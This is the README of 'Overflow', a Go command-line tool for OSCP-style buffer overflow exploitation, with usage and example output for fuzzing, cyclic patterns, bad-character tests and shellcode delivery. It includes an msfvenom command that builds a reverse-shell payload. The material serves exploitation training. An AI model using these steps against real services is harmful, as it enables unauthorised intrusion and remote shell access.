# Overflow

[![Build Status](https://img.shields.io/github/workflow/status/sradley/overflow/Test?style=flat-square)](https://github.com/sradley/overflow/actions)
[![Latest Release](https://img.shields.io/github/v/release/sradley/overflow?style=flat-square)](https://github.com/sradley/overflow/releases)
[![Downloads](https://img.shields.io/github/downloads/sradley/overflow/total?style=flat-square)](https://github.com/sradley/overflow/releases)
[![Issues](https://img.shields.io/github/issues/sradley/overflow?style=flat-square)](https://github.com/sradley/overflow/issues)
[![Go Version](https://img.shields.io/github/go-mod/go-version/sradley/overflow?style=flat-square)](https://golang.org/)

Overflow is a command-line tool used exploiting OSCP-style buffer overflow
vulnerabilities with a focus on rapid exploitation. However, I would
**strongly** suggest that you understand everything that this tool can do,
particularly if you're planning on getting your OSCP certification. Have fun!

![fuzz.gif](doc/fuzz.gif)

## Installation

### Pre-Built Binaries
If you don't have a golang environment, or you just don't feel like building
from source, you can check out the
[releases](https://github.com/sradley/overflow/releases) page for pre-built
binaries.

### Using Go Get
If you have a golang environment set up, you can use `go get` to fetch and
install the binary in your `$GOPATH/bin` directory.
```sh
$ go get github.com/sradley/overflow
```

### Building from Source
If you have a golang environment set up, you can build straight from source.

The following commands will install dependencies and compile a working binary. 
```sh
$ git clone https://github.com/sradley/overflow.git
$ cd overflow
$ go get && go build
```

You can also use `go install` to install the binary in your `$GOPATH/bin`
directory.
```sh
$ git clone https://github.com/sradley/overflow.git
$ cd overflow
$ go install
```

## Usage
The help text is pretty exhaustive, so it's a good place to start if you want
to get a feel for this tool.
```
$ overflow help
$ overflow (fuzz | pattern | chars | exploit) --help
```

The required flags for every subcommand are "host" and "port". You can also
specify any prefixes or suffixes to put before and after the payload, in the
case that a menu or something is presented to you when you open the socket.

### Fuzzing for Buffer Length
Possibly the most important step in buffer overflow exploitation is finding the
length of buffer you want to target. An easy way to do this is to send
increasingly large sequences of bytes to the buffer until it crashes.

The `fuzz` subcommand sends increasingly large sequences of bytes (the increase
is specifed by the "step" flag) until the service crashes. This tool also
outputs the possible size of the buffer, in case it wasn't easy enough already. 

The required flags are "host", "port" and "step".
```
$ overflow fuzz (-H|--host HOST) (-P|--port PORT) (-S|--step STEP) [flags]
```

### Sending Cyclic Patterns
Why would you want to do this? Well, sending a cyclic pattern of bytes to the
target service is a very easy way to figure out the offset of the EIP register.
Tools like `mona` can automatically determine the offset of particular
registers if buffer has been overflowed with a cyclic pattern of bytes.

The `pattern` subcommand streamlines the process of generating a cyclic pattern
of bytes and sending it to the target service. Turning what is normally an
annoying multi-step process into a single command.

The required flags are "host", "port" and "length".
```
$ overflow pattern (-H|--host HOST) (-P|--port PORT) (-l|--length LENGTH) [flags]
```

### Sending Bad Characters
An important part of buffer overflow exploitation is determining which
characters are "bad", or which characters are treated differently by the target
service.

The `chars` subcommand sends every character from 0x00 to 0xFF to the target
service. You can optionally exclude particular characters from the payload sent
to the target service.

Required flags are "host", "port" and "offset".
```
$ overflow chars (-H|--host HOST) (-P|--port PORT) (-o|--offset OFFSET) [flags]
```

### Running Exploits
Once you've found the offset of the EIP register, and a valid jump address, you
can execute shellcode on the target service. The `exploit` subcommand provides
an easy way to do so.

Required parameters are "host", "port", "offset", "jump" and "shell". Where
shell is the path to your desired payload.
```
$ overflow exploit (-H|--host HOST) (-P|--port PORT) (-o|--offset OFFSET) \
    (-j|--jump JUMP) (-S|--shell SHELL) [flags]
```

## Examples

### Fuzzing for Buffer Length
Here's a quick example using this subcommand to fuzz for the length of the
target buffer in 100-byte steps.
```
$ overflow fuzz -H 127.0.0.1 -P 4444 -S 100
```
```
  ______   __   __ ______   ______
 /\  __ \ /\ \ / //\  ___\ /\  == \
 \ \ \/\ \\ \ \'/ \ \  __\ \ \  __< 
  \ \_____\\ \__|  \ \_____\\ \_\ \_\
   \/_____/ \/_/    \/_____/ \/_/ /_/
      ______  __       ______   __     __
     /\  ___\/\ \     /\  __ \ /\ \  _ \ \
     \ \  __\\ \ \____\ \ \/\ \\ \ \/ ".\ \
      \ \_\   \ \_____\\ \_____\\ \__/".~\_\
       \/_/    \/_____/ \/_____/ \/_/   \/_/

        v1.1.0

 by Stephen Radley             github.com/sradley
──────────────────────────────────────────────────
 :: Mode        : fuzz
 :: Host        : 127.0.0.1
 :: Port        : 4444
 :: Step        : 100
 :: Wait        : 1000ms
──────────────────────────────────────────────────
 > Building payload.
 > Sending 100-byte payload.
 > Building payload.
 > Sending 200-byte payload.
 > Building payload.
 > Sending 300-byte payload.
 > Building payload.
 > Sending 400-byte payload.
 > Building payload.
 > Sending 500-byte payload.
 
 Success! Length of buffer is in range (400, 500].
```

### Sending Cyclic patterns
Here's a quick example using this subcommand to send a 60-byte cyclic pattern
to the target service.
```
$ overflow pattern -H 127.0.0.1 -P 4444 -l 65
```
```
  ______   __   __ ______   ______
 /\  __ \ /\ \ / //\  ___\ /\  == \
 \ \ \/\ \\ \ \'/ \ \  __\ \ \  __< 
  \ \_____\\ \__|  \ \_____\\ \_\ \_\
   \/_____/ \/_/    \/_____/ \/_/ /_/
      ______  __       ______   __     __
     /\  ___\/\ \     /\  __ \ /\ \  _ \ \
     \ \  __\\ \ \____\ \ \/\ \\ \ \/ ".\ \
      \ \_\   \ \_____\\ \_____\\ \__/".~\_\
       \/_/    \/_____/ \/_____/ \/_/   \/_/

        v1.1.0

 by Stephen Radley             github.com/sradley
──────────────────────────────────────────────────
 :: Mode        : pattern
 :: Host        : 127.0.0.1
 :: Port        : 4444
 :: Length      : 65
──────────────────────────────────────────────────
 > Generating pattern.
 > Building payload.
 > Sending 65-byte payload.
 
 Success! No errors found.
```

You can see the pattern sent in the `netcat` output below.
```
$ nc -lvp 4444
Connection from 127.0.0.1:48870
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac
```

### Sending Bad Characters
Here's an example showing the use of this subcommand. Make sure you include the
offset to the EIP register.
```
$ overflow chars -H 127.0.0.1 -P 4444 -o 160
```
```
  ______   __   __ ______   ______
 /\  __ \ /\ \ / //\  ___\ /\  == \
 \ \ \/\ \\ \ \'/ \ \  __\ \ \  __< 
  \ \_____\\ \__|  \ \_____\\ \_\ \_\
   \/_____/ \/_/    \/_____/ \/_/ /_/
      ______  __       ______   __     __
     /\  ___\/\ \     /\  __ \ /\ \  _ \ \
     \ \  __\\ \ \____\ \ \/\ \\ \ \/ ".\ \
      \ \_\   \ \_____\\ \_____\\ \__/".~\_\
       \/_/    \/_____/ \/_____/ \/_/   \/_/

        v1.1.0

 by Stephen Radley             github.com/sradley
──────────────────────────────────────────────────
 :: Mode        : chars
 :: Host        : 127.0.0.1
 :: Port        : 4444
 :: Offset      : 160
 :: Exclude     : ""
──────────────────────────────────────────────────
 > Parsing exclusions.
 > Generating characters.
 > Building payload.
 > Sending 416-byte payload. 
 
 Success! No errors found.
```

You can also optionally specify characters to exclude from the payload, make
sure that you use the format in the example below.
```
$ overflow chars -H 127.0.0.1 -P 4444 -o 160 -e "\x00\x41\xAB\x01"
```
```
  ______   __   __ ______   ______
 /\  __ \ /\ \ / //\  ___\ /\  == \
 \ \ \/\ \\ \ \'/ \ \  __\ \ \  __< 
  \ \_____\\ \__|  \ \_____\\ \_\ \_\
   \/_____/ \/_/    \/_____/ \/_/ /_/
      ______  __       ______   __     __
     /\  ___\/\ \     /\  __ \ /\ \  _ \ \
     \ \  __\\ \ \____\ \ \/\ \\ \ \/ ".\ \
      \ \_\   \ \_____\\ \_____\\ \__/".~\_\
       \/_/    \/_____/ \/_____/ \/_/   \/_/

        v1.1.0

 by Stephen Radley             github.com/sradley
──────────────────────────────────────────────────
 :: Mode        : chars
 :: Host        : 127.0.0.1
 :: Port        : 4444
 :: Offset      : 160
 :: Exclude     : "\x00\x41\xAB\x01"
──────────────────────────────────────────────────
 > Parsing exclusions.
 > Generating characters.
 > Building payload.
 > Sending 412-byte payload. 
 
 Success! No errors found.
```

### Running Exploits
Here's a brief example explaining how you can use the `exploit` subcommand to
execute a payload generated by `msfvenom`.

Generate a **raw** payload using `msfvenom`, call it whatever you want.
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4321 \
    EXITFUNC=thread -b "\x00" -f raw -o payload.shell
```

Then just use the tool as follows, ensuring you include the offset to the EIP
register and the jump address in the format used below. Don't forget that if
the target system is little-endian you need to write the jump address
backwards (e.g. if the address is "\x01\x02\x03\x04", write it as
"\x04\x03\x02\x01").
```
$ overflow exploit -H 127.0.0.1 -P 4444 -o 160 -j "\x5f\x4a\x35\x8f" -S path/to/payload.shell
```
```
  ______   __   __ ______   ______
 /\  __ \ /\ \ / //\  ___\ /\  == \
 \ \ \/\ \\ \ \'/ \ \  __\ \ \  __< 
  \ \_____\\ \__|  \ \_____\\ \_\ \_\
   \/_____/ \/_/    \/_____/ \/_/ /_/
      ______  __       ______   __     __
     /\  ___\/\ \     /\  __ \ /\ \  _ \ \
     \ \  __\\ \ \____\ \ \/\ \\ \ \/ ".\ \
      \ \_\   \ \_____\\ \_____\\ \__/".~\_\
       \/_/    \/_____/ \/_____/ \/_/   \/_/

        v1.1.0

 by Stephen Radley             github.com/sradley
──────────────────────────────────────────────────
 :: Mode        : exploit
 :: Host        : 127.0.0.1
 :: Port        : 4444
 :: Offset      : 160
 :: Jump        : "\x5f\x4a\x35\x8f"
 :: NOPs        : 16
 :: Shell       : payload.shell
──────────────────────────────────────────────────
 > Parsing jump address.
 > Reading shellcode.
 > Building payload.
 > Sending 535-byte payload.
 
 Success! No errors found.
```
